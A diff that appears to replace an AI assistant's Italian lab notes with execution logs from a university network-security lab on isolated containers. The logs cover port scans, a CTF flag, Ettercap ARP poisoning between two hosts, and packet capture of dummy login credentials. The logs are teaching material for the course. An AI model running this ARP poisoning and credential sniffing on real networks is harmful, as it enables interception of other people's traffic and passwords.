-  * `Envelope-to`, `Received: from labinf_bob.environment_secnet ([10.0.2.20]) by ... with esmtp (Exim 4.98.2)`
-  * `Subject: Richiesta Voto`
-  * Corpo del messaggio: `Ho bisogno di un voto maggiore di 27, il mio id e 123456`.
-* **Analisi Tecnica & Rilevanza**:
-  * Il protocollo SMTP classico (RFC 5321) trasmette sia i metadati di busta che il testo in chiaro.
-  * Intercettazione MITM e rischio di alterazione del messaggio in transito.
-  * Contromisure: **STARTTLS**, **DKIM** (DomainKeys Identified Mail) per l'integrità del messaggio, **SPF** (Sender Policy Framework) e **DMARC** per l'autenticazione del mittente.
+SUPER SECRET ASCII CAT v2.4.67 proudly made by NSA
 
----
+SSI{p0rt_scann3r5_4r3_4w3s0m3}
+--- stderr ---
+(empty)
 
-### Procediamo con la Creazione del Documento Finale?
+====================================================================================================
+[Alice listeners — after mock-FTP probe fix]
+Node: alice
+Started: 2026-10-12T08:17:53+02:00
+Ended: 2026-10-12T08:17:53+02:00
+Command: netstat -ltup
+Exit status: 0
+--- stdout ---
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      11/python3          
+tcp        0      0 0.0.0.0:http            0.0.0.0:*               LISTEN      10/httpd            
+tcp        0      0 0.0.0.0:ftp             0.0.0.0:*               LISTEN      14/python3          
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN      15/sshd: /usr/sbin/ 
+tcp        0      0 0.0.0.0:smtp            0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.11:35559        0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:iprop           0.0.0.0:*               LISTEN      14/python3          
+tcp6       0      0 [::]:ssh                [::]:*                  LISTEN      15/sshd: /usr/sbin/ 
+tcp6       0      0 [::]:smtp               [::]:*                  LISTEN      -                   
+udp        0      0 127.0.0.11:33152        0.0.0.0:*                           -                   
+--- stderr ---
+(empty)
 
-Tutti i log reali raccolti in [`lab01_execution_output.txt`](file:///Users/nicolabeccaceci/Desktop/SICUREZZA%20DEI%20SISTEMI%20INFORMATIVI/LABS/lab01/solution/logs/lab01_execution_output.txt) sono pronti per essere inseriti.
+====================================================================================================
+[Exercise 4: service version detection — after mock-FTP probe fix]
+Node: bob
+Started: 2026-10-12T08:17:53+02:00
+Ended: 2026-10-12T08:17:59+02:00
+Command: nmap -sV -Pn -p 1-1024 -v 10.92.2.10
+Exit status: 0
+--- stdout ---
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 06:17 +0000
+NSE: Loaded 48 scripts for scanning.
+Initiating ARP Ping Scan at 06:17
+Scanning 10.92.2.10 [1 port]
+Completed ARP Ping Scan at 06:17, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:17
+Completed Parallel DNS resolution of 1 host. at 06:17, 0.00s elapsed
+Initiating SYN Stealth Scan at 06:17
+Scanning labinf-alice-1.labinf_secnet (10.92.2.10) [1024 ports]
+Discovered open port 25/tcp on 10.92.2.10
+Discovered open port 21/tcp on 10.92.2.10
+Discovered open port 80/tcp on 10.92.2.10
+Discovered open port 22/tcp on 10.92.2.10
+Completed SYN Stealth Scan at 06:17, 0.03s elapsed (1024 total ports)
+Initiating Service scan at 06:17
+Scanning 4 services on labinf-alice-1.labinf_secnet (10.92.2.10)
+Completed Service scan at 06:17, 6.02s elapsed (4 services on 1 host)
+NSE: Script scanning 10.92.2.10.
+Initiating NSE at 06:17
+Completed NSE at 06:17, 0.01s elapsed
+Initiating NSE at 06:17
+Completed NSE at 06:17, 0.01s elapsed
+Nmap scan report for labinf-alice-1.labinf_secnet (10.92.2.10)
+Host is up (0.0000050s latency).
+Not shown: 1020 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp?
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
+25/tcp open  smtp    Exim smtpd 4.98.2
+80/tcp open  http    Apache httpd 2.4.69 ((Unix))
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.99%I=7%D=10/12%Time=6ACC7B93%P=aarch64-unknown-linux-gnu
+SF:%r(NULL,15,"Enter\x20your\x20username:\x20")%r(GenericLines,15,"Enter\x
+SF:20your\x20username:\x20")%r(Help,15,"Enter\x20your\x20username:\x20")%r
+SF:(GetRequest,15,"Enter\x20your\x20username:\x20")%r(HTTPOptions,15,"Ente
+SF:r\x20your\x20username:\x20")%r(RTSPRequest,15,"Enter\x20your\x20usernam
+SF:e:\x20")%r(RPCCheck,15,"Enter\x20your\x20username:\x20")%r(DNSVersionBi
+SF:ndReqTCP,15,"Enter\x20your\x20username:\x20")%r(DNSStatusRequestTCP,15,
+SF:"Enter\x20your\x20username:\x20")%r(SSLSessionReq,15,"Enter\x20your\x20
+SF:username:\x20")%r(TerminalServerCookie,15,"Enter\x20your\x20username:\x
+SF:20")%r(TLSSessionReq,15,"Enter\x20your\x20username:\x20")%r(Kerberos,15
+SF:,"Enter\x20your\x20username:\x20")%r(SMBProgNeg,15,"Enter\x20your\x20us
+SF:ername:\x20")%r(X11Probe,15,"Enter\x20your\x20username:\x20")%r(FourOhF
+SF:ourRequest,15,"Enter\x20your\x20username:\x20")%r(LPDString,15,"Enter\x
+SF:20your\x20username:\x20")%r(LDAPSearchReq,15,"Enter\x20your\x20username
+SF::\x20")%r(LDAPBindReq,15,"Enter\x20your\x20username:\x20")%r(SIPOptions
+SF:,15,"Enter\x20your\x20username:\x20")%r(LANDesk-RC,15,"Enter\x20your\x2
+SF:0username:\x20")%r(TerminalServer,15,"Enter\x20your\x20username:\x20")%
+SF:r(NCP,15,"Enter\x20your\x20username:\x20")%r(NotesRPC,15,"Enter\x20your
+SF:\x20username:\x20")%r(JavaRMI,15,"Enter\x20your\x20username:\x20")%r(WM
+SF:SRequest,15,"Enter\x20your\x20username:\x20")%r(oracle-tns,15,"Enter\x2
+SF:0your\x20username:\x20")%r(ms-sql-s,15,"Enter\x20your\x20username:\x20"
+SF:)%r(afp,15,"Enter\x20your\x20username:\x20")%r(giop,15,"Enter\x20your\x
+SF:20username:\x20");
+MAC Address: 2A:B9:9F:03:D8:44 (Unknown)
+Service Info: Host: 9d762842f783; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Seguendo le regole definite nella skill:
-1. Verrà redatto il documento LaTeX completo in `.tmp_build/`.
-2. Verrà sottoposto a verifica da parte dell'esperto di sicurezza informatica.
-3. Verrà compilato producendo [**`LABS/lab01/lab01_solution.pdf`**](file:///Users/nicolabeccaceci/Desktop/SICUREZZA%20DEI%20SISTEMI%20INFORMATIVI/LABS/lab01/lab01_solution.pdf).
-4. Verrà effettuata la pulizia finale, lasciando nella cartella esclusivamente il materiale del professore e la soluzione PDF.
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.27 seconds
+           Raw packets sent: 1025 (45.084KB) | Rcvd: 1025 (41.004KB)
+--- stderr ---
+(empty)
 
-Sei d'accordo che proceda con la compilazione e generazione di `lab01_solution.pdf`?
+====================================================================================================
+[Exercise 4: aggressive scan — after mock-FTP probe fix]
+Node: bob
+Started: 2026-10-12T08:17:59+02:00
+Ended: 2026-10-12T08:18:25+02:00
+Command: nmap -A -Pn -p 1-1024 -v 10.92.2.10
+Exit status: 0
+--- stdout ---
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-12 06:17 +0000
+NSE: Loaded 158 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 06:17
+Completed NSE at 06:17, 0.00s elapsed
+Initiating NSE at 06:17
+Completed NSE at 06:17, 0.00s elapsed
+Initiating NSE at 06:17
+Completed NSE at 06:17, 0.00s elapsed
+Initiating ARP Ping Scan at 06:17
+Scanning 10.92.2.10 [1 port]
+Completed ARP Ping Scan at 06:17, 0.04s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 06:17
+Completed Parallel DNS resolution of 1 host. at 06:17, 0.00s elapsed
+Initiating SYN Stealth Scan at 06:17
+Scanning labinf-alice-1.labinf_secnet (10.92.2.10) [1024 ports]
+Discovered open port 21/tcp on 10.92.2.10
+Discovered open port 80/tcp on 10.92.2.10
+Discovered open port 25/tcp on 10.92.2.10
+Discovered open port 22/tcp on 10.92.2.10
+Completed SYN Stealth Scan at 06:17, 0.02s elapsed (1024 total ports)
+Initiating Service scan at 06:17
+Scanning 4 services on labinf-alice-1.labinf_secnet (10.92.2.10)
+Completed Service scan at 06:18, 6.02s elapsed (4 services on 1 host)
+Initiating OS detection (try #1) against labinf-alice-1.labinf_secnet (10.92.2.10)
+NSE: Script scanning 10.92.2.10.
+Initiating NSE at 06:18
+Completed NSE at 06:18, 8.06s elapsed
+Initiating NSE at 06:18
+Completed NSE at 06:18, 10.07s elapsed
+Initiating NSE at 06:18
+Completed NSE at 06:18, 0.00s elapsed
+Nmap scan report for labinf-alice-1.labinf_secnet (10.92.2.10)
+Host is up (0.00015s latency).
+Not shown: 1020 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|_    Enter your username:
+|_ftp-bounce: ERROR: Script execution failed (use -d to debug)
+22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
+25/tcp open  smtp    Exim smtpd 4.98.2
+|_smtp-commands: SMTP: EHLO 501 Syntactically invalid EHLO argument(s)\x0D
+80/tcp open  http    Apache httpd 2.4.69 ((Unix))
+| http-methods: 
+|   Supported Methods: POST OPTIONS HEAD GET TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.69 (Unix)
+|_http-title: My Beautiful Page
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.99%I=7%D=10/12%Time=6ACC7B99%P=aarch64-unknown-linux-gnu
+SF:%r(NULL,15,"Enter\x20your\x20username:\x20")%r(GenericLines,15,"Enter\x
+SF:20your\x20username:\x20")%r(Help,15,"Enter\x20your\x20username:\x20")%r
+SF:(GetRequest,15,"Enter\x20your\x20username:\x20")%r(HTTPOptions,15,"Ente
+SF:r\x20your\x20username:\x20")%r(RTSPRequest,15,"Enter\x20your\x20usernam
+SF:e:\x20")%r(RPCCheck,15,"Enter\x20your\x20username:\x20")%r(DNSVersionBi
+SF:ndReqTCP,15,"Enter\x20your\x20username:\x20")%r(DNSStatusRequestTCP,15,
+SF:"Enter\x20your\x20username:\x20")%r(SSLSessionReq,15,"Enter\x20your\x20
+SF:username:\x20")%r(TerminalServerCookie,15,"Enter\x20your\x20username:\x
+SF:20")%r(TLSSessionReq,15,"Enter\x20your\x20username:\x20")%r(Kerberos,15
+SF:,"Enter\x20your\x20username:\x20")%r(SMBProgNeg,15,"Enter\x20your\x20us
+SF:ername:\x20")%r(X11Probe,15,"Enter\x20your\x20username:\x20")%r(FourOhF
+SF:ourRequest,15,"Enter\x20your\x20username:\x20")%r(LPDString,15,"Enter\x
+SF:20your\x20username:\x20")%r(LDAPSearchReq,15,"Enter\x20your\x20username
+SF::\x20")%r(LDAPBindReq,15,"Enter\x20your\x20username:\x20")%r(SIPOptions
+SF:,15,"Enter\x20your\x20username:\x20")%r(LANDesk-RC,15,"Enter\x20your\x2
+SF:0username:\x20")%r(TerminalServer,15,"Enter\x20your\x20username:\x20")%
+SF:r(NCP,15,"Enter\x20your\x20username:\x20")%r(NotesRPC,15,"Enter\x20your
+SF:\x20username:\x20")%r(JavaRMI,15,"Enter\x20your\x20username:\x20")%r(WM
+SF:SRequest,15,"Enter\x20your\x20username:\x20")%r(oracle-tns,15,"Enter\x2
+SF:0your\x20username:\x20")%r(ms-sql-s,15,"Enter\x20your\x20username:\x20"
+SF:)%r(afp,15,"Enter\x20your\x20username:\x20")%r(giop,15,"Enter\x20your\x
+SF:20username:\x20");
+MAC Address: 2A:B9:9F:03:D8:44 (Unknown)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Uptime guess: 43.097 days (since Sun Aug 30 03:58:44 2026)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: Host: 9d762842f783; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.15 ms labinf-alice-1.labinf_secnet (10.92.2.10)
+
+NSE: Script Post-scanning.
+Initiating NSE at 06:18
+Completed NSE at 06:18, 0.00s elapsed
+Initiating NSE at 06:18
+Completed NSE at 06:18, 0.00s elapsed
+Initiating NSE at 06:18
+Completed NSE at 06:18, 0.00s elapsed
+Read data files from: /usr/share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.83 seconds
+           Raw packets sent: 1047 (46.862KB) | Rcvd: 1039 (42.254KB)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Challenge: HTTP landing page — after mock-FTP probe fix]
+Node: bob
+Started: 2026-10-12T08:18:25+02:00
+Ended: 2026-10-12T08:18:25+02:00
+Command: curl -sS -i http://10.92.2.10/index.html
+Exit status: 0
+--- stdout ---
+HTTP/1.1 200 OK
+Date: Mon, 12 Oct 2026 06:18:25 GMT
+Server: Apache/2.4.69 (Unix)
+Last-Modified: Fri, 09 Oct 2026 20:36:06 GMT
+ETag: "1c7-65d6e4c2bf980"
+Accept-Ranges: bytes
+Content-Length: 455
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>My Beautiful Page</title>
+</head>
+</head>
+<body>
+    <h1>This is the most incredible and astonishing HTML page you will encounter in your entire existence! Prepare to have your mind shattered in front of the brilliance and complexity of this masterpiece!</h1>
+    </br>
+    <p>Here is a picture of a cat that hides absolutely nothing:</p>
+    <a href="secret.html"><img src="cat.jpg" alt="Cat"></a>
+</body>
+</html>
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Challenge: direct challenge service — after mock-FTP probe fix]
+Node: bob
+Started: 2026-10-12T08:18:25+02:00
+Ended: 2026-10-12T08:18:25+02:00
+Command: timeout 5 nc -w 3 10.92.2.10 1337
+Exit status: 0
+--- stdout ---
+Press enter to start this powerful program:                       /^--^\     /^--^\     /^--^\
+                      \____/     \____/     \____/
+                     /      \   /      \   /      \
+                    |        | |        | |        |
+                     \__  __/   \__  __/   \__  __/
+ ^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|^|
+| | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | | |
+########################/ /######\ \###########/ /#######################
+| | | | | | | | | | | | \/| | | | \/| | | | | | \/ | | | | | | | | | | | |
+|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|_|
+
+SUPER SECRET ASCII CAT v2.4.67 proudly made by NSA
+
+SSI{p0rt_scann3r5_4r3_4w3s0m3}
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: clear stale neighbor cache]
+Node: alice
+Started: 2026-10-12T08:20:33+02:00
+Ended: 2026-10-12T08:20:33+02:00
+Command: ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: clear stale neighbor cache]
+Node: bob
+Started: 2026-10-12T08:20:33+02:00
+Ended: 2026-10-12T08:20:33+02:00
+Command: ip neigh flush all
+Exit status: 1
+--- stdout ---
+(empty)
+--- stderr ---
+Failed to send flush request: Operation not permitted
+
+====================================================================================================
+[Exercise 5: clear stale neighbor cache]
+Node: alice
+Started: 2026-10-12T08:20:44+02:00
+Ended: 2026-10-12T08:20:44+02:00
+Command: ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: clear stale neighbor cache]
+Node: bob
+Started: 2026-10-12T08:20:44+02:00
+Ended: 2026-10-12T08:20:44+02:00
+Command: sudo -n ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: clear stale neighbor cache]
+Node: chuck
+Started: 2026-10-12T08:20:44+02:00
+Ended: 2026-10-12T08:20:44+02:00
+Command: sudo -n ip neigh flush all
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: baseline ping from Alice]
+Node: alice
+Started: 2026-10-12T08:20:44+02:00
+Ended: 2026-10-12T08:20:44+02:00
+Command: ping -c 1 -W 2 10.92.2.20; ping -c 1 -W 2 10.92.2.30; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.20 (10.92.2.20) 56(84) bytes of data.
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=0.125 ms
+
+--- 10.92.2.20 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.125/0.125/0.125/0.000 ms
+PING 10.92.2.30 (10.92.2.30) 56(84) bytes of data.
+64 bytes from 10.92.2.30: icmp_seq=1 ttl=64 time=0.102 ms
+
+--- 10.92.2.30 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.102/0.102/0.102/0.000 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-bob-1.labinf_sec  ether   86:e8:5f:bf:03:b0   C                     eth0
+labinf-chuck-1.labinf_s  ether   76:0b:00:c9:38:f5   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: baseline ping from Bob]
+Node: bob
+Started: 2026-10-12T08:20:44+02:00
+Ended: 2026-10-12T08:20:44+02:00
+Command: ping -c 1 -W 2 10.92.2.10; ping -c 1 -W 2 10.92.2.30; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.10 (10.92.2.10) 56(84) bytes of data.
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=0.120 ms
+
+--- 10.92.2.10 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.120/0.120/0.120/0.000 ms
+PING 10.92.2.30 (10.92.2.30) 56(84) bytes of data.
+64 bytes from 10.92.2.30: icmp_seq=1 ttl=64 time=0.043 ms
+
+--- 10.92.2.30 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.043/0.043/0.043/0.000 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-chuck-1.labinf_s  ether   76:0b:00:c9:38:f5   C                     eth0
+labinf-alice-1.labinf_s  ether   f6:cd:44:fd:b5:4a   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: baseline ping from Chuck]
+Node: chuck
+Started: 2026-10-12T08:20:44+02:00
+Ended: 2026-10-12T08:20:45+02:00
+Command: ping -c 1 -W 2 10.92.2.10; ping -c 1 -W 2 10.92.2.20; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.10 (10.92.2.10) 56(84) bytes of data.
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=0.115 ms
+
+--- 10.92.2.10 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.115/0.115/0.115/0.000 ms
+PING 10.92.2.20 (10.92.2.20) 56(84) bytes of data.
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=0.033 ms
+
+--- 10.92.2.20 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.033/0.033/0.033/0.000 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-bob-1.labinf_sec  ether   86:e8:5f:bf:03:b0   C                     eth0
+labinf-alice-1.labinf_s  ether   f6:cd:44:fd:b5:4a   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: start Ettercap ARP poisoning]
+Node: chuck
+Started: 2026-10-12T08:20:45+02:00
+Ended: 2026-10-12T08:20:45+02:00
+Command: nohup labinf-ettercap -T -q -M arp /10.92.2.10// /10.92.2.20// >/tmp/lab01_ettercap.log 2>&1 </dev/null & echo "Ettercap PID: $!"
+Exit status: 0
+--- stdout ---
+Ettercap PID: 5751
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: Ettercap launch output]
+Node: chuck
+Started: 2026-10-12T08:20:48+02:00
+Ended: 2026-10-12T08:20:48+02:00
+Command: cat /tmp/lab01_ettercap.log
+Exit status: 0
+--- stdout ---
+
+[1mettercap 0.8.4.1[0m copyright 2001-2026 Ettercap Development Team
+
+Listening on:
+  eth0 -> 76:0B:00:C9:38:F5
+	  10.92.2.30/255.255.255.0
+
+
+This product includes GeoLite2 Data created by MaxMind, available from https://www.maxmind.com/.
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to EUID 65534 EGID 65534...
+
+  34 plugins
+  42 protocol dissectors
+  56 ports monitored
+38702 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+Lua: no scripts were specified, not starting up!
+
+Scanning for merged targets (2 hosts)...
+
+
+/ |=========================>                         |  50.00 %
+- |==================================================>| 100.00 %
+* |==================================================>| 100.00 %
+
+2 hosts added to the hosts list...
+
+ARP poisoning victims:
+
+ GROUP 1 : 10.92.2.10 F6:CD:44:FD:B5:4A
+
+ GROUP 2 : 10.92.2.20 86:E8:5F:BF:03:B0
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: forwarding status on Chuck]
+Node: chuck
+Started: 2026-10-12T08:20:48+02:00
+Ended: 2026-10-12T08:20:48+02:00
+Command: sysctl net.ipv4.ip_forward
+Exit status: 0
+--- stdout ---
+net.ipv4.ip_forward = 1
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: post-poison ping from Bob]
+Node: bob
+Started: 2026-10-12T08:20:48+02:00
+Ended: 2026-10-12T08:20:49+02:00
+Command: ping -c 2 -W 2 10.92.2.10; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.10 (10.92.2.10) 56(84) bytes of data.
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=63 time=0.073 ms
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=63 time=0.295 ms (DUP!)
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=0.391 ms (DUP!)
+64 bytes from 10.92.2.10: icmp_seq=1 ttl=64 time=2.27 ms (DUP!)
+From 10.92.2.30 icmp_seq=2 Redirect Host(New nexthop: 10.92.2.10)
+
+--- 10.92.2.10 ping statistics ---
+2 packets transmitted, 1 received, +3 duplicates, +1 errors, 50% packet loss, time 1012ms
+rtt min/avg/max/mdev = 0.073/0.757/2.270/0.880 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-chuck-1.labinf_s  ether   76:0b:00:c9:38:f5   C                     eth0
+labinf-alice-1.labinf_s  ether   76:0b:00:c9:38:f5   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: post-poison ping from Alice]
+Node: alice
+Started: 2026-10-12T08:20:49+02:00
+Ended: 2026-10-12T08:20:50+02:00
+Command: ping -c 2 -W 2 10.92.2.20; arp -e
+Exit status: 0
+--- stdout ---
+PING 10.92.2.20 (10.92.2.20) 56(84) bytes of data.
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=63 time=0.089 ms
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=63 time=1.83 ms (DUP!)
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=1.85 ms (DUP!)
+64 bytes from 10.92.2.20: icmp_seq=1 ttl=64 time=3.76 ms (DUP!)
+From 10.92.2.30 icmp_seq=2 Redirect Host(New nexthop: 10.92.2.20)
+
+--- 10.92.2.20 ping statistics ---
+2 packets transmitted, 1 received, +3 duplicates, +1 errors, 50% packet loss, time 1003ms
+rtt min/avg/max/mdev = 0.089/1.880/3.759/1.298 ms
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-bob-1.labinf_sec  ether   76:0b:00:c9:38:f5   C                     eth0
+labinf-chuck-1.labinf_s  ether   76:0b:00:c9:38:f5   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 5: Chuck neighbor cache]
+Node: chuck
+Started: 2026-10-12T08:20:50+02:00
+Ended: 2026-10-12T08:20:50+02:00
+Command: arp -e
+Exit status: 0
+--- stdout ---
+Address                  HWtype  HWaddress           Flags Mask            Iface
+labinf-bob-1.labinf_sec  ether   86:e8:5f:bf:03:b0   C                     eth0
+labinf-alice-1.labinf_s  ether   f6:cd:44:fd:b5:4a   C                     eth0
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 8: remote-browser capability preflight]
+Node: chuck
+Started: 2026-10-12T08:20:50+02:00
+Ended: 2026-10-12T08:20:50+02:00
+Command: printf "DISPLAY=%s\n" "$DISPLAY"; command -v firefox || true; command -v xhost || true; ettercap -P list 2>&1 | grep -F remote_browser
+Exit status: 0
+--- stdout ---
+DISPLAY=
+  remote_browser  1.2  Sends visited URLs to the browser
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: begin HTTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:21:17+02:00
+Ended: 2026-10-12T08:21:17+02:00
+Command: docker exec -d labinf-chuck-1 tcpdump -i eth0 -U -s 0 -w /tmp/lab01_http.pcap host 10.92.2.20 and host 10.92.2.10 and tcp port 80
+Exit status: 0
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: Bob submits dummy HTTP credentials]
+Node: bob
+Started: 2026-10-12T08:21:18+02:00
+Ended: 2026-10-12T08:21:18+02:00
+Command: curl -sS -i -X POST -d 'username=lab01_demo&password=Lab01Demo!' http://10.92.2.10/login.html
+Exit status: 0
+--- stdout ---
+HTTP/1.1 200 OK
+Date: Mon, 12 Oct 2026 06:21:18 GMT
+Server: Apache/2.4.69 (Unix)
+Last-Modified: Fri, 09 Oct 2026 20:36:06 GMT
+ETag: "75d-65d6e4c2bf980"
+Accept-Ranges: bytes
+Content-Length: 1885
+Content-Type: text/html
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Useful Login Page</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f2f2f2;
+        }
+        
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .container h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Useful Login</h2>
+        <form method="post">
+            <div class="form-group">
+                <label for="username">Username:</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password:</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <button type="submit">Login</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: stop HTTP packet capture]
+Node: chuck
+Started: 2026-10-12T08:21:19+02:00
+Ended: 2026-10-12T08:21:19+02:00
+Command: pkill -INT -x tcpdump
+Exit status: 1
+--- stdout ---
+(empty)
+--- stderr ---
+(empty)
+
+====================================================================================================
+[Exercise 6: inspect captured cleartext HTTP form]
+Node: chuck
+Started: 2026-10-12T08:21:19+02:00
+Ended: 2026-10-12T08:21:19+02:00
+Command: tshark -r /tmp/lab01_http.pcap -Y 'http.request.method == \"POST\"' -T fields -e frame.time_relative -e ip.src -e ip.dst -e http.host -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
+Exit status: 4
+--- stdout ---
+(empty)
+--- stderr ---
+tshark: "\" was unexpected in this context.
+    http.request.method == \"POST\"
+                           ^
+
+====================================================================================================
+[Exercise 6: inspect captured HTTP payload]
+Node: chuck
+Started: 2026-10-12T08:21:19+02:00
+Ended: 2026-10-12T08:21:19+02:00
